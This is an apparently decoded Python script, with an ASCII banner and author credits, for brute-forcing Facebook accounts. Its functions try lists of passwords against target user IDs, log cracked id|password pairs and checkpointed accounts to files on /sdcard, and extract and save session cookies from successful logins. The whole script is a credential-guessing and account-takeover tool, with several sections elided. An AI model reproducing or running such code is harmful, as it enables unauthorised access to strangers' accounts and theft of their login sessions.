#DECODE/BY/SaManDar
#AdEi LuGk
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.AdEi LuGk')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=AdEi LuGk')
...
________________________________________________
      ...
      dM.    `MMMMMMMb.`MMMMMMMMM `MM'
     ,MMb     MM    `Mb MM      \  MM 
     d'YM.    MM     MM MM         MM 
    ,P `Mb    MM     MM MM    ,    MM 
    d'  YM.   MM     MM MMMMMMM    MM 
   ,P   `Mb   MM     MM MM    `    MM 
   d'    YM.  MM     MM MM         MM 
  ,MMMMMMMMb  MM     MM MM         MM 
  d'      YM. MM    .M9 MM      /  MM 
_dM_     _dMM_MMMMMMM9'_MMMMMMMMM _MM_
            
                           
================================================
\033[1;31m================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{AdEi LuGk}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{ AdEi LuGk}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{AdEi LuGk}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{AdEi LuGk}\33[0;m      
...
\033[1;31m================================================
\33[37;41m\t WELLCOME TO AdEi LuGk TOOLS\33[0;m
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [AdEi LuGk-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [AdEi LuGk-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AdEi LuGk-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AdEi LuGk-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/AdEi LuGk-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/AdEi LuGk-CP.txt','a').write(ids+'|'+pas+'\n')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [AdEi LuGk]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [AdEi LuGk==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/AdEi LuGk-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AdEi LuGk-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
